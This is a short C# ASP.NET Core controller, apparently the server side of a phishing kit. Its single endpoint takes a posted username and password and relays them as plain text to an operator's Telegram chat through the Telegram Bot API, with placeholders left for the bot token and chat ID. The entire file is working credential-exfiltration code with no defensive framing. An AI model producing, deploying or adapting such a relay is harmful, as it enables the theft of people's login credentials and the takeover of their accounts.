using Microsoft.AspNetCore.Mvc;

namespace GetPasswordAPI.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class GetpwithTelegramController : ControllerBase
    {
        private readonly string _botToken = "your_Bot_Token";
        private readonly string _chatID = "you can enter your Telegram account chatid here";

        [HttpPost]
        public async Task<IActionResult> SendMessage([FromBody] User user)
        {
            try
            {
                string userData = $"Login: {user.Username}\nPassword: {user.Password}";

                using (HttpClient client = new HttpClient())
                {
                    string telegramAPI = $"https://api.telegram.org/bot{_botToken}/sendMessage";

                    var messageData = new
                    {
                        chat_id = _chatID,
                        text = userData
                    };

                    var response = await client.PostAsJsonAsync(telegramAPI, messageData);

                    response.EnsureSuccessStatusCode();

                    return Ok(new { Message = "Message sent successfully." });
                }
            }
            catch (Exception ex)
            {
                return BadRequest(new { Error = $"An error occurred: {ex.Message}" });
            }
        }
    }
}
